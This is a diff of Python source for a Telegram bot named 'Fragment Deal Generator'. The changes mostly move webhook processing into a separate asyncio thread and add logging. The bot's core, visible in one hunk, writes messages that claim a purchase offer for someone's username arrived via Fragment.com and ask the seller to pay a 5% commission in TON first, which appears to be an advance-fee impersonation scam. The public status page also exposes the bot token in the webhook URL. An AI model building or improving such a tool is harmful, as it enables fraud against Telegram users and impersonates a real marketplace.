@@ -3,6 +3,7 @@ import time
 import urllib.request
 import json
 import asyncio
+import threading
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from urllib.parse import urlparse, parse_qs
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -14,7 +15,7 @@ FIXED_CHAT_ID = 511758924
 PORT = int(os.getenv('PORT', 10000))
 WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"
 
-print(f"🤖 Fragment Deal Generator v3.0 - WEBHOOK")
+print(f"🤖 Fragment Deal Generator v3.1 - WEBHOOK FIXED")
 print(f"🔑 Token: ✅")
 print(f"🎯 Chat ID: {FIXED_CHAT_ID}")
 print(f"🌐 Port: {PORT}")
@@ -23,6 +24,7 @@ print(f"🔗 Webhook: {WEBHOOK_URL}")
 # Variables globales
 app = None
 bot_status = "STARTING"
+event_loop = None
 
 # ===== PRIX TON =====
 def get_ton_price():
@@ -44,7 +46,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user = update.effective_user
         chat_id = update.effective_chat.id
         
-        message = f"""🤖 **Fragment Deal Generator v3.0**
+        message = f"""🤖 **Fragment Deal Generator v3.1**
 
 Hello {user.first_name}! 👋
 
@@ -108,8 +110,8 @@ async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Message Fragment
         fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:
 
-• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
-• Commission: 💎{commission:g} (${commission_usd:.2f} USD)
+• Offer Amount: 💎{price:g} TON (${price_usd:.2f} USD)
+• Commission: 💎{commission:g} TON (${commission_usd:.2f} USD)
 
 Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.
 
@@ -182,41 +184,82 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         print(f"❌ HELP error: {e}")
 
+# ===== TRAITEMENT UPDATES =====
+def process_update_sync(update_data):
+    """Traitement synchrone des updates"""
+    try:
+        print(f"📡 Processing webhook data...")
+        
+        # Création de l'Update
+        update = Update.de_json(update_data, app.bot)
+        
+        if update:
+            print(f"🔄 Update created: {update.update_id}")
+            
+            # Exécution dans la boucle asyncio du thread bot
+            future = asyncio.run_coroutine_threadsafe(
+                app.process_update(update), 
+                event_loop
+            )
+            
+            # Attendre le résultat avec timeout
+            future.result(timeout=10)
+            print(f"✅ Update processed: {update.update_id}")
+            return True
+        else:
+            print("❌ Failed to create Update object")
+            return False
+            
+    except Exception as e:
+        print(f"❌ Process update sync error: {e}")
+        return False
+
 # ===== SERVEUR WEBHOOK =====
 class WebhookHandler(BaseHTTPRequestHandler):
     def do_POST(self):
         """Traitement des webhooks Telegram"""
         try:
+            print(f"📨 POST request: {self.path}")
+            
             if self.path == f"/{BOT_TOKEN}":
                 # Lecture du body
                 content_length = int(self.headers.get('Content-Length', 0))
                 post_data = self.rfile.read(content_length)
                 
-                print(f"📡 Webhook reçu: {len(post_data)} bytes")
+                print(f"📡 Webhook received: {len(post_data)} bytes")
                 
                 # Parse JSON
-                update_data = json.loads(post_data.decode('utf-8'))
+                try:
+                    update_data = json.loads(post_data.decode('utf-8'))
+                    print(f"📋 Update data keys: {list(update_data.keys())}")
+                except json.JSONDecodeError as e:
+                    print(f"❌ JSON decode error: {e}")
+                    self.send_error(400, "Invalid JSON")
+                    return
                 
-                # Création de l'Update
-                update = Update.de_json(update_data, app.bot)
+                # Traitement de l'update
+                success = process_update_sync(update_data)
                 
-                # Traitement asyncio
-                if update:
-                    asyncio.create_task(process_update(update))
-                    print(f"✅ Update traité: {update.update_id}")
-                
-                # Réponse OK
+                # Réponse HTTP
                 self.send_response(200)
                 self.send_header('Content-type', 'application/json')
                 self.end_headers()
-                self.wfile.write(b'{"ok":true}')
+                
+                response = {"ok": True, "processed": success}
+                self.wfile.write(json.dumps(response).encode())
+                
+                print(f"✅ Response sent: {response}")
                 
             else:
-                self.send_error(404)
+                print(f"❌ Wrong path: {self.path}")
+                self.send_error(404, "Path not found")
                 
         except Exception as e:
             print(f"❌ Webhook error: {e}")
-            self.send_error(500)
+            try:
+                self.send_error(500, f"Server error: {str(e)}")
+            except:
+                pass
     
     def do_GET(self):
         """Page de statut"""
@@ -224,6 +267,15 @@ class WebhookHandler(BaseHTTPRequestHandler):
             self.send_response(200)
             self.send_header('Content-type', 'text/html; charset=utf-8')
             self.end_headers()
+            
+            # Informations de statut
+            webhook_info = "Unknown"
+            try:
+                if app and hasattr(app, 'bot'):
+                    # Note: On ne peut pas faire d'appel async ici
+                    webhook_info = f"{WEBHOOK_URL}/{BOT_TOKEN}"
+            except:
+                pass
             
             html = f"""<!DOCTYPE html>
 <html>
@@ -240,17 +292,23 @@ class WebhookHandler(BaseHTTPRequestHandler):
 </head>
 <body>
     <div class="container">
-        <h1>🤖 Fragment Deal Generator v3.0</h1>
+        <h1>🤖 Fragment Deal Generator v3.1</h1>
         <p class="status">✅ Status: {bot_status}</p>
         <div class="info">
-            <p><strong>🔗 Bot:</strong> @BidRequestMiniApp_bot</p>
+            <p><strong>🔗 Bot:</strong> Fragment Deal Generator</p>
             <p><strong>📡 Mode:</strong> Webhook</p>
             <p><strong>🌐 System:</strong> Render Cloud</p>
             <p><strong>🕐 Time:</strong> {time.strftime('%Y-%m-%d %H:%M:%S UTC')}</p>
             <p><strong>💎 Target Chat:</strong> {FIXED_CHAT_ID}</p>
+            <p><strong>🔄 Loop:</strong> {"Active" if event_loop and not event_loop.is_closed() else "Inactive"}</p>
         </div>
-        <p><strong>Webhook URL:</strong> {WEBHOOK_URL}/{BOT_TOKEN}</p>
+        <p><strong>Webhook URL:</strong> {webhook_info}</p>
         <p>Ready to generate Fragment deals! 🚀</p>
+        
+        <div style="margin-top: 20px; padding: 10px; background: #f8f9fa; border-radius: 5px;">
+            <p><strong>Test webhook:</strong></p>
+            <code>curl -X POST {webhook_info} -H "Content-Type: application/json" -d '{{"test": true}}'</code>
+        </div>
     </div>
 </body>
 </html>"""
@@ -261,18 +319,10 @@ class WebhookHandler(BaseHTTPRequestHandler):
             print(f"❌ GET error: {e}")
     
     def log_message(self, format, *args):
-        """Désactiver les logs HTTP"""
+        """Désactiver les logs HTTP par défaut"""
         pass
 
-async def process_update(update: Update):
-    """Traitement des updates Telegram"""
-    try:
-        print(f"🔄 Processing update: {update.update_id}")
-        await app.process_update(update)
-    except Exception as e:
-        print(f"❌ Process update error: {e}")
-
-# ===== INITIALISATION =====
+# ===== SETUP BOT =====
 async def setup_bot():
     """Setup du bot avec webhook"""
     global app, bot_status
@@ -296,23 +346,29 @@ async def setup_bot():
         
         # Test de connexion
         bot_info = await app.bot.get_me()
-        print(f"✅ Connected to: @{bot_info.username}")
+        print(f"✅ Connected to: @{bot_info.username} (ID: {bot_info.id})")
         
         # Configuration du webhook
         webhook_url = f"{WEBHOOK_URL}/{BOT_TOKEN}"
         
         try:
-            await app.bot.delete_webhook()
-            print("🗑️ Ancien webhook supprimé")
-        except:
-            pass
+            # Suppression ancien webhook
+            await app.bot.delete_webhook(drop_pending_updates=True)
+            print("🗑️ Old webhook deleted")
+        except Exception as e:
+            print(f"⚠️ Delete webhook warning: {e}")
         
+        # Attendre un peu
+        await asyncio.sleep(1)
+        
+        # Configuration nouveau webhook
         await app.bot.set_webhook(url=webhook_url)
-        print(f"🔗 Webhook configuré: {webhook_url}")
+        print(f"🔗 Webhook configured: {webhook_url}")
         
         # Vérification
         webhook_info = await app.bot.get_webhook_info()
-        print(f"📡 Webhook actif: {webhook_info.url}")
+        print(f"📡 Webhook active: {webhook_info.url}")
+        print(f"📊 Pending updates: {webhook_info.pending_update_count}")
         
         bot_status = "RUNNING"
         print("✅ Bot ready!")
@@ -321,16 +377,62 @@ async def setup_bot():
         
     except Exception as e:
         print(f"❌ Setup error: {e}")
-        bot_status = "ERROR"
+        bot_status = f"ERROR: {str(e)}"
         return False
 
+async def bot_loop():
+    """Boucle principale du bot"""
+    global event_loop
+    
+    try:
+        print("🔄 Starting bot loop...")
+        
+        # Récupérer la boucle courante
+        event_loop = asyncio.get_running_loop()
+        print(f"✅ Event loop: {event_loop}")
+        
+        # Setup du bot
+        success = await setup_bot()
+        if not success:
+            print("❌ Bot setup failed")
+            return
+        
+        print("🎯 Bot configured successfully!")
+        print("⏳ Waiting for webhooks...")
+        
+        # Boucle infinie pour maintenir le bot actif
+        while True:
+            await asyncio.sleep(30)  # Ping toutes les 30 secondes
+            
+            try:
+                # Test périodique de santé
+                me = await app.bot.get_me()
+                print(f"💚 Bot health check: @{me.username}")
+            except Exception as e:
+                print(f"⚠️ Health check failed: {e}")
+        
+    except Exception as e:
+        print(f"❌ Bot loop error: {e}")
+    
+    finally:
+        print("🔚 Bot loop ended")
+
+def run_bot():
+    """Thread pour le bot"""
+    try:
+        print("🚀 Bot thread starting...")
+        asyncio.run(bot_loop())
+    except Exception as e:
+        print(f"❌ Bot thread error: {e}")
+
 def run_server():
-    """Serveur HTTP avec webhook"""
+    """Serveur HTTP pour webhooks"""
     try:
         print(f"🌐 Starting HTTP server on port {PORT}...")
         
         server = HTTPServer(('0.0.0.0', PORT), WebhookHandler)
         print(f"✅ Server started: http://0.0.0.0:{PORT}")
+        print(f"🔗 Webhook endpoint: /{BOT_TOKEN}")
         
         server.serve_forever()
         
@@ -339,22 +441,22 @@ def run_server():
         raise
 
 # ===== MAIN =====
-async def main():
+def main():
     """Point d'entrée principal"""
-    print("🚀 Starting Fragment Deal Generator v3.0...")
+    print("🚀 Starting Fragment Deal Generator v3.1...")
     print("=" * 60)
     
     try:
-        # Setup du bot
-        success = await setup_bot()
-        if not success:
-            print("❌ Bot setup failed")
-            return
+        # Démarrage du bot en thread séparé
+        bot_thread = threading.Thread(target=run_bot, daemon=True, name="BotThread")
+        bot_thread.start()
+        print("✅ Bot thread started")
         
-        print("🎯 Bot configured successfully!")
+        # Attendre que le bot soit initialisé
+        time.sleep(5)
+        
+        # Démarrage du serveur HTTP (blocking)
         print("🌐 Starting HTTP server...")
-        
-        # Le serveur HTTP bloque ici (mode webhook)
         run_server()
         
     except KeyboardInterrupt:
@@ -364,18 +466,7 @@ async def main():
         print(f"❌ MAIN ERROR: {e}")
         
     finally:
-        if app:
-            try:
-                await app.shutdown()
-                print("🔚 Bot shutdown complete")
-            except:
-                pass
+        print("🔚 Application ended")
 
 if __name__ == '__main__':
-    # Démarrage avec asyncio
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print("\n🛑 Interrupted")
-    except Exception as e:
-        print(f"❌ Fatal error: {e}")
+    main()
